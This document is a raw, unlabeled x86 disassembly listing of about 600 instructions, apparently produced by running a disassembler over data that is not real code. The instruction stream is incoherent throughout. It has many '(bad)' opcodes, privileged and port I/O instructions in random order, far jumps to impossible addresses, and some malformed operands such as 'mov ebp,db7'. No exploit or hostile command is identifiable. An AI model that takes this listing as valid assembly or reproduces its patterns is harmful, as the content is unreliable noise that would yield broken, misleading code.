  40b2ac:	mov    ds:0x5210010f,eax
  40b2b1:	addr16 jg 0x40b2e5
  40b2b4:	(bad)  
  40b2b5:	loope  0x40b2ea
  40b2b7:	jecxz  0x40b30e
  40b2b9:	xor    eax,0xe43803a8
  40b2be:	js     0x40b280
  40b2c0:	stos   DWORD PTR es:[edi],eax
  40b2c1:	pop    edi
  40b2c2:	adc    eax,0x989d8b50
  40b2c7:	and    BYTE PTR [eax-0x354ca11a],ah
  40b2cd:	cmp    edi,DWORD PTR [eax-0x39a998a0]
  40b2d3:	add    eax,ecx
  40b2d5:	cli    
  40b2d6:	arpl   di,bp
  40b2d8:	and    al,0xb3
  40b2da:	inc    esp
  40b2db:	ds pop esp
  40b2dd:	stos   BYTE PTR es:[edi],al
  40b2de:	imul   edi,DWORD PTR cs:[eax+edx*4],0xffffffa5
  40b2e3:	mov    eax,0x7cc4d9a5
  40b2e8:	cld    
  40b2e9:	es jle 0x40b296
  40b2ec:	rcl    DWORD PTR [edx+0x6a],cl
  40b2ef:	inc    edi
  40b2f0:	sub    BYTE PTR [edx+eax*8-0x52],bh
  40b2f4:	inc    eax
  40b2f5:	inc    edx
  40b2f6:	ss js  0x40b2e5
  40b2f9:	test   eax,0x148e4187
  40b2fe:	scas   al,BYTE PTR es:[edi]
  40b2ff:	nop
  40b300:	xor    dh,bh
  40b302:	gs push esp
  40b304:	push   ecx
  40b305:	lea    ebx,[ecx-0x33]
  40b308:	push   ds
  40b309:	js     0x40b34b
  40b30b:	cld    
  40b30c:	fnstcw WORD PTR es:[eax]
  40b30f:	and    ch,BYTE PTR [ecx+edi*2-0x14906578]
  40b316:	mov    ebp,0xed44cee9
  40b31b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b31c:	sub    ebp,DWORD PTR [edx]
  40b31e:	add    dl,al
  40b320:	loopne 0x40b2aa
  40b322:	mov    edx,0xa7c943b9
  40b327:	mov    BYTE PTR [edi+0x18],ch
  40b32a:	and    BYTE PTR [edi+0x3e68768d],dl
  40b330:	outs   dx,BYTE PTR ds:[esi]
  40b331:	dec    eax
  40b332:	dec    edi
  40b333:	aas    
  40b334:	push   eax
  40b335:	jb     0x40b326
  40b337:	pop    edi
  40b338:	or     eax,0x2f53a3a3
  40b33d:	sub    DWORD PTR [eax+0x7c],0xd8da87c
  40b344:	aam    0xb8
  40b346:	mov    ah,0xe1
  40b348:	rcr    BYTE PTR [edi],cl
  40b34a:	mov    ds:0x7a5a2846,al
  40b34f:	xor    ah,BYTE PTR [ecx]
  40b351:	into   
  40b352:	xchg   edi,eax
  40b353:	ss pushf 
  40b355:	add    bh,BYTE PTR [edi]
  40b357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b358:	retf   
  40b359:	inc    ecx
  40b35a:	call   DWORD PTR [edi]
  40b35c:	add    BYTE PTR [ebx],0xd2
  40b35f:	fist   WORD PTR [eax]
  40b361:	jbe    0x40b386
  40b363:	or     DWORD PTR [edx-0x76aee6a5],esp
  40b369:	inc    edi
  40b36a:	scas   al,BYTE PTR es:[edi]
  40b36b:	sbb    al,0xa4
  40b36d:	jbe    0x40b3b7
  40b36f:	(bad)  
  40b370:	pop    edi
  40b371:	push   es
  40b372:	jne    0x40b3c5
  40b374:	(bad)  
  40b376:	imul   ebx,ebx,0x1e
  40b379:	push   cs
  40b37a:	jmp    0x7e99146d
  40b37f:	pop    edx
  40b380:	stc    
  40b381:	gs mov eax,0xe0c3036
  40b387:	xchg   ebx,eax
  40b388:	cmp    DWORD PTR [ecx-0x3f14a30b],0x16
  40b38f:	test   BYTE PTR [ecx-0x43],cl
  40b392:	fstp   TBYTE PTR [ecx-0xe]
  40b395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b396:	push   cs
  40b397:	outs   dx,DWORD PTR ds:[esi]
  40b398:	inc    edx
  40b399:	dec    edi
  40b39a:	lahf   
  40b39b:	pusha  
  40b39c:	shr    BYTE PTR [ebx+eiz*8+0x32],cl
  40b3a0:	(bad)  
  40b3a1:	in     al,0xc2
  40b3a3:	cwde   
  40b3a4:	cli    
  40b3a5:	repz pop ecx
  40b3a7:	mov    ah,cl
  40b3a9:	cld    
  40b3aa:	adc    eax,0x90d5b6a7
  40b3af:	(bad)  
  40b3b0:	outs   dx,BYTE PTR ds:[esi]
  40b3b1:	mov    eax,0xa1f23054
  40b3b6:	sar    BYTE PTR [esi-0x79],1
  40b3b9:	fsubrp st(6),st
  40b3bb:	sahf   
  40b3bc:	iret   
  40b3bd:	push   ecx
  40b3be:	cmp    ah,dh
  40b3c0:	hlt    
  40b3c1:	add    edx,DWORD PTR [ebx+0x7c]
  40b3c4:	ds push ebx
  40b3c6:	inc    ebp
  40b3c7:	add    al,dl
  40b3c9:	mov    eax,DWORD PTR [ebp+0x8]
  40b3cc:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3cf:	xor    eax,esi
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x1cce196
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	in     eax,0x8d
  40b3f2:	push   ecx
  40b3f3:	mov    dl,0xd7
  40b3f5:	enter  0x4232,0xe2
  40b3f9:	jg     0x40b46f
  40b3fb:	popf   
  40b3fc:	or     DWORD PTR [esi-0x19],edi
  40b3ff:	pop    esi
  40b400:	dec    ebp
  40b401:	int    0xae
  40b403:	sub    DWORD PTR [ebx+esi*8-0x34],ebx
  40b407:	xor    ebx,eax
  40b409:	mov    cl,0xa6
  40b40b:	push   ebp
  40b40c:	mov    ds:0xe2d1e3f7,eax
  40b411:	mov    cl,0xe0
  40b413:	sbb    DWORD PTR [esi+ecx*4+0x22e1eba4],ebp
  40b41a:	mov    ch,BYTE PTR [ecx+ebp*4-0x1a]
  40b41e:	aad    0xd0
  40b420:	sbb    BYTE PTR [ebx],0xc0
  40b423:	test   BYTE PTR [eax-0x3f],al
  40b426:	or     DWORD PTR [edx+0x4c6474b4],esp
  40b42c:	mov    dh,0xde
  40b42e:	scas   eax,DWORD PTR es:[edi]
  40b42f:	mov    WORD PTR [ecx],cs
  40b431:	sbb    eax,0x4f892a97
  40b436:	dec    edi
  40b437:	xor    BYTE PTR [edi+0xa],0xe9
  40b43b:	jge    0x40b3d2
  40b43d:	lds    esp,FWORD PTR [esi+0x66a42f9c]
  40b443:	pop    ss
  40b444:	xchg   DWORD PTR [edx+ebp*4+0x698b5392],ebx
  40b44b:	add    eax,DWORD PTR [esi]
  40b44d:	xor    DWORD PTR [ebx+ebx*2],esp
  40b450:	jle    0x40b466
  40b452:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40b454:	mov    WORD PTR [edx-0x7],?
  40b457:	ins    BYTE PTR es:[edi],dx
  40b458:	inc    ecx
  40b459:	sub    BYTE PTR [edi],al
  40b45b:	jmp    0x46ee9b57
  40b460:	ss retf 0x396b
  40b464:	fucomip st,st(2)
  40b466:	in     eax,dx
  40b467:	imul   esi,DWORD PTR [ebp-0x63dbed7b],0xfc02c06f
  40b471:	dec    eax
  40b472:	push   es
  40b473:	stos   BYTE PTR es:[edi],al
  40b474:	or     ecx,DWORD PTR [eax-0x55fee248]
  40b47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b47b:	xchg   ebx,eax
  40b47c:	and    al,0xcb
  40b47e:	pop    esi
  40b47f:	cs clc 
  40b481:	jno    0x40b45c
  40b483:	outs   dx,DWORD PTR ds:[esi]
  40b485:	mov    BYTE PTR [ebp-0x61f0f05b],ch
  40b48b:	inc    esi
  40b48c:	sub    ecx,DWORD PTR [edx-0x1fe16816]
  40b492:	mov    edx,0xeb7c1392
  40b497:	aad    0x55
  40b499:	dec    ebp
  40b49a:	xchg   ebx,eax
  40b49b:	(bad)  
  40b49c:	call   0xa88d7982
  40b4a1:	xor    dh,BYTE PTR [ecx]
  40b4a3:	adc    bl,BYTE PTR [esi+0x1]
  40b4a6:	sti    
  40b4a7:	dec    edi
  40b4a8:	leave  
  40b4a9:	and    esi,edi
  40b4ab:	nop
  40b4ac:	mov    esi,0x69e70f82
  40b4b1:	adc    DWORD PTR [eax+edx*1+0x18],esp
  40b4b5:	loope  0x40b4be
  40b4b7:	and    ecx,eax
  40b4b9:	cdq    
  40b4ba:	inc    esi
  40b4bb:	lock iret 
  40b4bd:	fld    DWORD PTR [edi-0xa]
  40b4c0:	mov    edi,0x9cb5ddc9
  40b4c5:	rol    BYTE PTR [eax+0x67103c9e],0x85
  40b4cc:	jl     0x40b452
  40b4ce:	rcl    DWORD PTR [eax+edi*4],cl
  40b4d1:	lahf   
  40b4d2:	ds cwde 
  40b4d4:	mov    dl,0xe1
  40b4d6:	jp     0x40b48f
  40b4d8:	push   ebp
  40b4d9:	mov    eax,ds:0x49e58ebe
  40b4de:	es sub ch,0xa3
  40b4e2:	pop    ss
  40b4e3:	aas    
  40b4e4:	outs   dx,DWORD PTR ds:[esi]
  40b4e5:	mov    cl,BYTE PTR [ebx]
  40b4e7:	mov    cl,dl
  40b4e9:	or     bh,BYTE PTR [ebx+eiz*4-0x748f843f]
  40b4f0:	imul   esp,DWORD PTR [eax+eax*2-0x1a1a8744],0xffffffed
  40b4f8:	inc    esi
  40b4f9:	cld    
  40b4fa:	sbb    BYTE PTR [edi],bl
  40b4fc:	push   ecx
  40b4fd:	mov    ebx,0x3a809463
  40b502:	adc    al,0xef
  40b504:	test   ah,dh
  40b506:	jne    0x40b533
  40b508:	push   esi
  40b509:	ja     0x40b576
  40b50b:	inc    eax
  40b50c:	bound  esi,QWORD PTR [ecx-0x3d02cda8]
  40b512:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b514:	adc    BYTE PTR [ecx],dh
  40b516:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b517:	cmp    esi,DWORD PTR [edx-0x1dc7e1f3]
  40b51d:	arpl   WORD PTR [eax+0x76],bp
  40b520:	push   0x2e71f2a1
  40b525:	push   ecx
  40b526:	outs   dx,DWORD PTR ds:[esi]
  40b527:	stc    
  40b528:	xor    eax,DWORD PTR [eax-0x55]
  40b52b:	mov    al,0xe
  40b52d:	mov    esp,DWORD PTR [ecx+0x51]
  40b530:	add    dh,BYTE PTR [ecx+edx*2-0x27]
  40b534:	push   0x3b
  40b536:	aaa    
  40b537:	fwait
  40b538:	ss mov dh,0x19
  40b53b:	daa    
  40b53c:	inc    esi
  40b53d:	mov    ch,0x65
  40b53f:	es adc al,0x48
  40b542:	and    al,0x9d
  40b544:	int    0x60
  40b546:	xchg   edx,eax
  40b547:	push   es
  40b548:	lahf   
  40b549:	add    al,ah
  40b54b:	sbb    al,0x11
  40b54d:	stos   DWORD PTR es:[edi],eax
  40b54e:	mov    WORD PTR [esi+0xd],?
  40b551:	or     dl,BYTE PTR [ebx+0x5d]
  40b554:	out    dx,al
  40b555:	sub    ecx,DWORD PTR [edx+0x27bf9cb]
  40b55b:	mov    ch,0xa5
  40b55d:	ss pop ecx
  40b55f:	inc    ecx
  40b560:	imul   eax,DWORD PTR [eax],0xffffff96
  40b563:	test   BYTE PTR [ebx+0x3a],ch
  40b566:	ret    0x5e82
  40b569:	setae  al
  40b56c:	add    eax,DWORD PTR [ebp-0x51a1e915]
  40b572:	jne    0x40b539
  40b574:	sbb    DWORD PTR [edi],edx
  40b576:	mov    ebp,0x2b91fb8e
  40b57b:	pop    ss
  40b57c:	in     al,0x51
  40b57e:	out    0x6a,al
  40b580:	inc    ebp
  40b581:	xor    BYTE PTR [eax],0x34
  40b584:	cdq    
  40b585:	shl    DWORD PTR [ecx-0x80],1
  40b588:	stos   BYTE PTR es:[edi],al
  40b589:	jg     0x40b560
  40b58b:	loope  0x40b604
  40b58d:	call   0x7d33:0x9556cbf9
  40b594:	imul   ebp,DWORD PTR [esi-0x506aa6b2],0xa0f6ab38
  40b59e:	popf   
  40b59f:	stc    
  40b5a0:	lods   al,BYTE PTR ds:[esi]
  40b5a1:	out    dx,al
  40b5a2:	arpl   WORD PTR [esi+ebp*1],si
  40b5a5:	push   edi
  40b5a6:	leave  
  40b5a7:	mov    dh,0x57
  40b5a9:	mov    al,ds:0x5c4a6b5a
  40b5ae:	xlat   BYTE PTR ds:[ebx]
  40b5af:	xchg   esp,eax
  40b5b0:	imul   eax,esi,0xffffffc0
  40b5b3:	xor    ch,BYTE PTR [ebx-0x4d]
  40b5b6:	stos   BYTE PTR es:[edi],al
  40b5b7:	mov    eax,0xb16fbcf9
  40b5bc:	sbb    eax,0x9a43d7d9
  40b5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5c2:	mov    al,ds:0xa4f28022
  40b5c7:	or     ecx,eax
  40b5c9:	mov    ebx,0x3c75370e
  40b5ce:	out    0x61,eax
  40b5d0:	out    dx,al
  40b5d1:	inc    edx
  40b5d2:	clc    
  40b5d3:	push   esi
  40b5d4:	imul   edi,DWORD PTR ds:[edx+0x6],0x3f
  40b5d9:	cmp    eax,0x3597942d
  40b5de:	pushf  
  40b5df:	adc    edx,esp
  40b5e1:	fidivr WORD PTR [edx]
  40b5e3:	(bad)  
  40b5e4:	and    al,dl
  40b5e6:	push   ebp
  40b5e7:	inc    ecx
  40b5e8:	inc    ebx
  40b5e9:	adc    al,0xcc
  40b5eb:	xchg   ebp,eax
  40b5ec:	jmp    0x40b618
  40b5ee:	(bad)  
  40b5ef:	fldenv [esi-0x32e74ae6]
  40b5f5:	and    al,BYTE PTR [esi]
  40b5f7:	mov    fs,ebp
  40b5f9:	mov    DWORD PTR gs:[edi+ecx*2-0x38],ebp
  40b5fe:	ret    
  40b5ff:	dec    edx
  40b600:	scas   eax,DWORD PTR es:[edi]
  40b601:	outs   dx,BYTE PTR ds:[esi]
  40b602:	rol    BYTE PTR [ecx+0x2f],cl
  40b605:	mov    al,0xfc
  40b607:	adc    cl,BYTE PTR [edi-0x5eb49e75]
  40b60d:	lock xor DWORD PTR [ebp+0x5713844e],0xed0b9b67
  40b618:	pop    ecx
  40b619:	mov    ds:0x7bb409b,eax
  40b61e:	mov    DWORD PTR [ecx-0x33],ebx
  40b621:	retf   
  40b622:	call   0x1c58:0xeb95db1b
  40b629:	mov    cl,0x1e
  40b62b:	imul   ebx,esi,0x3c
  40b62e:	faddp  st(0),st
  40b630:	out    0x35,al
  40b632:	and    DWORD PTR [edi],0x259ff2eb
  40b638:	sbb    eax,0x67
  40b63b:	cmp    al,0x45
  40b63d:	cs add eax,0x705ba37a
  40b644:	mov    esp,0x2d2f4954
  40b649:	test   al,0x78
  40b64b:	jmp    0x5d07170d
  40b650:	ret    
  40b651:	or     al,0xb9
  40b653:	mov    edi,0x42e77863
  40b658:	repnz push ecx
  40b65a:	fdivr  QWORD PTR [esi+0x75]
  40b65d:	call   0x4abae3a7
  40b662:	wbinvd 
  40b664:	mov    BYTE PTR [edx-0x14ceb061],al
  40b66a:	adc    esp,DWORD PTR [esi+edx*4-0x639283bc]
  40b671:	loop   0x40b6bc
  40b673:	xor    eax,0x44ba616f
  40b678:	ins    DWORD PTR es:[edi],dx
  40b679:	xlat   BYTE PTR ds:[ebx]
  40b67a:	shl    ah,1
  40b67c:	aam    0x39
  40b67e:	fild   WORD PTR [ebp+0x32e55d39]
  40b684:	push   esp
  40b685:	xor    al,0x5d
  40b687:	aad    0xb3
  40b689:	push   esp
  40b68a:	leave  
  40b68b:	lods   eax,DWORD PTR ds:[esi]
  40b68c:	icebp  
  40b68d:	mov    al,BYTE PTR [edx-0x5d]
  40b690:	imul   ecx,DWORD PTR [edx+0x5],0x61a96bbc
  40b697:	loop   0x40b68c
  40b699:	jne    0x40b6c6
  40b69b:	(bad)  
  40b69c:	push   es
  40b69d:	ins    DWORD PTR es:[edi],dx
  40b69e:	fnstcw WORD PTR [ecx]
  40b6a0:	mov    edx,0x3a1b092f
  40b6a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6a7:	inc    DWORD PTR [edi-0x3b41bec7]
  40b6ad:	(bad)  
  40b6ae:	hlt    
  40b6af:	inc    edi
  40b6b0:	pushf  
  40b6b1:	clc    
  40b6b2:	and    ebp,eax
  40b6b4:	stos   DWORD PTR es:[edi],eax
  40b6b5:	mov    DWORD PTR [esi+edi*2-0x52],ebp
  40b6b9:	pop    es
  40b6ba:	mov    ah,0x21
  40b6bc:	sbb    edi,DWORD PTR [eax+ecx*1+0x71be14bd]
  40b6c3:	xor    al,0x7e
  40b6c5:	stc    
  40b6c6:	dec    esi
  40b6c7:	outs   dx,BYTE PTR ds:[esi]
  40b6c8:	test   al,0xdb
  40b6ca:	jne    0x40b677
  40b6cc:	jno    0x40b695
  40b6ce:	pop    ebp
  40b6cf:	fstp   TBYTE PTR [esi+0x36]
  40b6d2:	push   es
  40b6d3:	lea    eax,[ebx-0x15]
  40b6d6:	sub    DWORD PTR [esp+eax*8],ebp
  40b6d9:	jne    0x40b684
  40b6db:	test   BYTE PTR [edi+0x238e1a20],cl
  40b6e1:	sar    DWORD PTR [esi+eiz*4],0x9a
  40b6e5:	aas    
  40b6e6:	and    BYTE PTR [ebx],dl
  40b6e8:	imul   DWORD PTR [edi]
  40b6ea:	xchg   ecx,eax
  40b6eb:	add    DWORD PTR [edi],eax
  40b6ed:	test   ch,ch
  40b6ef:	or     edx,esp
  40b6f1:	mov    ds:0xe90189ac,ax
  40b6f7:	xchg   DWORD PTR [ecx],ecx
  40b6f9:	add    BYTE PTR [eax],al
  40b6fb:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40b702:	jmp    0x40c082
  40b707:	jmp    0x40ba28
  40b70c:	and    esp,esi
  40b70e:	jnp    0x40b710
  40b710:	cmp    esp,ecx
  40b712:	and    ebp,esp
  40b714:	jp     0x40b6f1
  40b716:	push   edx
  40b717:	mov    WORD PTR [eax+0x14d17b9e],ss
  40b71d:	clc    
  40b71e:	jle    0x40b79e
  40b720:	jp     0x40b79f
  40b722:	jle    0x40b7a2
  40b724:	in     eax,0x56
  40b726:	shl    DWORD PTR [edx-0x6f],0xf0
  40b72a:	loopne 0x40b7a2
  40b72c:	stos   BYTE PTR es:[edi],al
  40b72d:	mov    ebp,db7
  40b730:	stos   DWORD PTR es:[edi],eax
  40b731:	mov    eax,0x6824b5b0
  40b736:	xor    BYTE PTR [edx+0x75],cl
  40b739:	and    eax,0xc6599e3d
  40b73e:	sbb    ebx,ebp
  40b740:	pop    esp
  40b741:	js     0x40b765
  40b743:	mov    ds:0x1a844de5,eax
  40b749:	(bad)
  40b74c:	xor    DWORD PTR [edx],ebx
  40b74e:	mov    edi,0xa19f50a2
  40b753:	repz jle 0x40b747
  40b756:	iret   
  40b757:	rol    DWORD PTR [edx+0x2ab6c02b],cl
  40b75d:	dec    BYTE PTR [ecx-0x30]
  40b760:	mov    cl,0x63
  40b762:	test   ebx,0x79ac44fa
  40b768:	cs push es
  40b76a:	test   eax,0x79c4f7ec
  40b76f:	fisubr WORD PTR [edi-0x20]
  40b772:	mov    edi,0xf1323159
  40b777:	int3   
  40b778:	pop    eax
  40b779:	cdq    
  40b77a:	cli    
  40b77b:	push   ds
  40b77c:	sub    ah,BYTE PTR [ebx-0x80]
  40b77f:	pop    ds
  40b780:	cwde   
  40b781:	mov    eax,ds:0xc310b7ed
  40b786:	cmp    al,0xba
  40b788:	xchg   esp,eax
  40b789:	outs   dx,DWORD PTR ds:[esi]
  40b78a:	inc    ecx
  40b78b:	scas   eax,DWORD PTR es:[edi]
  40b78c:	popa   
  40b78d:	icebp  
  40b78e:	xchg   ebx,eax
  40b78f:	sub    eax,0xdcd770dd
  40b794:	bound  eax,QWORD PTR [eax]
  40b796:	shr    BYTE PTR [ebx+0x78d1e415],0x58
  40b79d:	std    
  40b79e:	jns    0x40b736
  40b7a0:	pushf  
  40b7a1:	stos   BYTE PTR es:[edi],al
  40b7a2:	xchg   ebp,eax
  40b7a3:	inc    esp
  40b7a4:	(bad)
  40b7a8:	add    esi,DWORD PTR [esi]
  40b7aa:	sub    DWORD PTR [esi+0xe],eax
  40b7ad:	xor    esp,DWORD PTR [esi+0x59]
  40b7b0:	add    cl,BYTE PTR [edx-0x4964c627]
  40b7b6:	daa    
  40b7b7:	push   esp
  40b7b8:	stos   DWORD PTR es:[edi],eax
  40b7b9:	das    
  40b7ba:	push   ebp
  40b7bb:	icebp  
  40b7bc:	dec    ebx
  40b7bd:	add    DWORD PTR [esi+eiz*2],esi
  40b7c0:	and    al,BYTE PTR [edx-0x56]
  40b7c3:	aad    0xb1
  40b7c5:	outs   dx,BYTE PTR ds:[esi]
  40b7c6:	jae    0x40b806
  40b7c8:	cmp    esp,DWORD PTR [edi]
  40b7ca:	(bad)  
  40b7cc:	pushf  
  40b7cd:	dec    edi
  40b7ce:	sbb    esi,DWORD PTR [edi+esi*1+0x2]
  40b7d2:	sbb    dh,BYTE PTR [ecx-0x40]
  40b7d5:	es dec esi
  40b7d7:	test   BYTE PTR [edi+0x75],ah
  40b7da:	jecxz  0x40b7aa
  40b7dc:	mov    al,0x59
  40b7de:	and    DWORD PTR ss:[edx+0x4c5a279a],eax
  40b7e5:	or     eax,0x22e64427
  40b7ea:	add    eax,0x787e26f
  40b7ef:	arpl   WORD PTR [ebp-0x3e7cfd1c],di
  40b7f5:	jecxz  0x40b799
  40b7f7:	adc    al,ah
  40b7f9:	sub    DWORD PTR [ebp+0x43],0x7d
  40b7fd:	nop
  40b7fe:	mov    esi,0x7d26c793
  40b803:	mov    ebx,0xb606fdb0
  40b808:	(bad)  
  40b809:	xor    DWORD PTR [edi-0x4f963e45],esp
  40b80f:	icebp  
  40b810:	xor    DWORD PTR [eax],ebx
  40b812:	jb     0x40b7f5
  40b814:	fiadd  DWORD PTR [edx+0x3d]
  40b817:	fiadd  WORD PTR [ecx-0x3773bd8f]
  40b81d:	test   DWORD PTR [ebp+0x258496c1],edx
  40b823:	jp     0x40b88f
  40b825:	or     ah,bl
  40b827:	imul   esi,edx,0x703a8204
  40b82d:	xchg   ch,dh
  40b82f:	rol    BYTE PTR [ebx-0xb941605],cl
  40b835:	loope  0x40b85b
  40b837:	rol    DWORD PTR [ebp-0x4f],cl
  40b83a:	fadd   QWORD PTR [ebp-0x4b]
  40b83d:	pop    ds
  40b83e:	mov    ah,0x9a
  40b840:	sub    bp,bp
  40b843:	sub    eax,0xe6cf058a
  40b848:	gs jae 0x40b810
  40b84b:	mov    dh,BYTE PTR [ebp-0x45d5be7d]
  40b851:	lods   al,BYTE PTR ds:[esi]
  40b852:	pop    ss
  40b853:	(bad)  
  40b855:	jno    0x40b8c5
  40b857:	jne    0x40b869
  40b859:	inc    esi
  40b85a:	xchg   edx,eax
  40b85b:	popa   
  40b85c:	test   BYTE PTR [ecx-0x4d],dl
  40b85f:	pop    ds
  40b860:	cmp    cl,BYTE PTR [ebp+0x43099031]
  40b866:	inc    edi
  40b867:	pop    es
  40b868:	or     BYTE PTR [ecx+0x47c7817c],dh
  40b86e:	test   bl,dl
  40b870:	xor    al,0xce
  40b872:	ret    0xc3a4
  40b875:	pop    ebx
  40b876:	shl    BYTE PTR [ebp-0x4a],1
  40b879:	fistp  DWORD PTR [edx-0x1f]
  40b87c:	outs   dx,DWORD PTR ds:[si]
  40b87e:	test   eax,0x44f6a2e0
  40b883:	mov    WORD PTR [ebp-0x53],ds
  40b886:	jnp    0x40b87f
  40b888:	sar    DWORD PTR [eax+0x69],cl
  40b88b:	cmc    
  40b88c:	call   0x25ed361b
  40b891:	mov    ebx,0xffda2298
  40b896:	and    dl,BYTE PTR [ebp+0x2d8bd340]
  40b89c:	push   edx
  40b89d:	mov    ch,0x1e
  40b8a0:	adc    DWORD PTR [esi+0xc105663],ecx
  40b8a6:	aas    
  40b8a7:	cli    
  40b8a8:	loop   0x40b86d
  40b8aa:	popa   
  40b8ab:	or     edi,DWORD PTR [edx-0x1909b7a4]
  40b8b1:	xchg   BYTE PTR [eax+0x7b],dl
  40b8b4:	sbb    esp,DWORD PTR [esi-0x5f42d77a]
  40b8ba:	fadd   QWORD PTR [ecx-0x5b]
  40b8bd:	jnp    0x40b8d6
  40b8bf:	mov    BYTE PTR [edx-0x1af8876c],cl
  40b8c5:	stc    
  40b8c6:	out    dx,eax
  40b8c7:	imul   esp,DWORD PTR [esi-0x31],0xd
  40b8cb:	mov    edx,0xd1e0a0e7
  40b8d0:	mov    cl,0xc5
  40b8d2:	dec    ecx
  40b8d3:	fidivr DWORD PTR [ecx+0x78df57ce]
  40b8d9:	sti    
  40b8da:	addr16 xchg ebx,eax
  40b8dc:	push   0xffffffc0
  40b8de:	addr16 xchg ecx,eax
  40b8e0:	ds out dx,al
  40b8e2:	js     0x40b868
  40b8e4:	imul   ecx,DWORD PTR [eax],0x2e85dd14
  40b8ea:	xlat   BYTE PTR ds:[ebx]
  40b8eb:	jne    0x40b8d2
  40b8ed:	mov    WORD PTR ds:0x7e249fdf,gs
  40b8f3:	xchg   edi,ebp
  40b8f5:	call   0x469970f4
  40b8fa:	fs bswap edx
  40b8fd:	jmp    0x9a1e:0x83ba55fe
  40b904:	lds    ecx,FWORD PTR [esp]
  40b907:	lods   al,BYTE PTR ds:[esi]
  40b908:	ds pop ecx
  40b90a:	outs   dx,BYTE PTR ds:[si]
  40b90c:	leave  
  40b90d:	jne    0x40b98b
  40b90f:	out    dx,al
  40b910:	repz test BYTE PTR [esi],dh
  40b913:	and    eax,0x317b7a45
  40b918:	xchg   ecx,eax
  40b919:	test   ah,dl
  40b91b:	inc    ecx
  40b91c:	pop    edx
  40b91d:	cmp    eax,0x33e35232
  40b922:	repnz test al,0xd6
  40b925:	cmp    DWORD PTR [edx-0x66328696],ebx
  40b92b:	fst    DWORD PTR [eax-0x34]
  40b92e:	call   0x2c12fcf6
  40b933:	sub    BYTE PTR [edi-0x2ed177a5],cl
  40b939:	retf   0xeaa4
  40b93c:	imul   esi,DWORD PTR [ebx-0x3d7a0906],0xeef987e7
  40b946:	(bad)  
  40b947:	shr    DWORD PTR [ecx+0xe593657],1
  40b94d:	iret   
  40b94e:	mov    edx,edi
  40b950:	(bad)  
  40b951:	inc    DWORD PTR [ecx+0x3f]
  40b954:	mov    edx,0x8d47d2b9
  40b959:	mov    dl,0x4f
  40b95b:	fisubr WORD PTR [esi-0x26]
  40b95e:	dec    esp
  40b95f:	jae    0x40b8e6
  40b961:	cmp    al,0x7f
  40b963:	mov    al,0x43
  40b965:	and    cl,al
  40b967:	mov    dl,0xea
  40b969:	xchg   ecx,eax
  40b96a:	ret    
  40b96b:	mov    al,ds:0x41d85a11
  40b970:	in     al,dx
  40b971:	dec    edi
  40b972:	lods   al,BYTE PTR ds:[esi]
  40b973:	push   edi
  40b974:	dec    ebp
  40b975:	or     esp,DWORD PTR [esp+esi*2]
  40b978:	std    
  40b979:	js     0x40b904
  40b97b:	mov    ch,0x11
  40b97d:	test   al,0x2a
  40b97f:	or     edi,ecx
  40b981:	sub    di,WORD PTR [esi-0x7f9e2603]
  40b988:	int    0x2c
  40b98a:	js     0x40b9d7
  40b98c:	jecxz  0x40b96f
  40b98e:	cs sub al,0x52
  40b991:	ja     0x40ba0d
  40b993:	mov    eax,0x29bbc4c9
  40b998:	sub    eax,0x21a0e45d
  40b99d:	stc    
  40b99e:	aaa    
  40b99f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9a0:	mov    gs,esi
  40b9a2:	data16 addr16 out dx,al
  40b9a5:	inc    edi
  40b9a6:	ja     0x40b9e6
  40b9a8:	sub    edx,DWORD PTR [ebp-0x389e7db7]
  40b9ae:	pop    esi
  40b9af:	lea    esp,[esp+eax*1+0x32ed58f7]
  40b9b6:	dec    esi
  40b9b7:	push   esp
  40b9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b9:	ins    BYTE PTR es:[edi],dx
  40b9ba:	and    eax,0x420ceaa4
  40b9bf:	and    esi,DWORD PTR [esi+esi*4]
  40b9c2:	jmp    0xe8af:0xc6d45d01
  40b9c9:	jae    0x40b991
  40b9cb:	mov    ds:0x6492bd92,al
  40b9d0:	sbb    esi,edi
  40b9d2:	aas    
  40b9d3:	scas   eax,DWORD PTR es:[edi]
  40b9d4:	hlt    
  40b9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9d6:	and    ebp,0xffffffef
  40b9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9da:	jmp    0x64b1fe9a
  40b9df:	pop    ebx
  40b9e0:	dec    ebx
  40b9e1:	sbb    eax,0x89e480cc
  40b9e6:	jns    0x40ba0c
  40b9e8:	mov    al,ds:0x39d60311
  40b9ed:	mov    edi,0xdce752bd
  40b9f2:	sub    al,0x7d
  40b9f4:	sbb    BYTE PTR [esi+0x56],bh
  40b9f7:	xchg   edx,ebp
  40b9f9:	push   cs
  40b9fa:	lods   eax,DWORD PTR ds:[esi]
  40b9fb:	out    0xc,al
  40b9fd:	fldenv [ebx]
  40b9ff:	and    DWORD PTR [esi],ebx
  40ba01:	test   BYTE PTR [edi-0x56],cl
  40ba04:	loop   0x40b9a0
  40ba06:	pop    esi
  40ba07:	ja     0x40ba75
  40ba09:	mov    edi,esi
  40ba0b:	jno    0x40b9b8
  40ba0d:	push   ebx
  40ba0e:	and    BYTE PTR [ecx+0x50be726],0xf9
  40ba15:	jecxz  0x40ba31
  40ba17:	inc    esi
